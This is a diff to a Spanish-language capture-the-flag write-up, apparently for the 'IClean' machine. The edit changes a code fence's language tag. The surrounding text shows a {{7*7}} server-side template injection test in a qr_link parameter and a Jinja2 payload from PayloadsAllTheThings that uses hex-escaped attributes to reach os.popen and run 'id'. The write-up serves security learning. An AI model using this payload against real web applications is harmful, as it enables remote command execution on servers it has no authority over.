@@ -155,7 +155,7 @@ Primero intento inyectando `{{7*7}}` en el parametro qr_link y al ver que si me 
 ![Payload](../assets/images-Iclean/Iclean13.png)
 
 buscando payloads encontre en [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) el siguiente payload que me sirvio.
-```Javascript
+```py
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
 ![SSTI](../assets/images-Iclean/Iclean14.png)
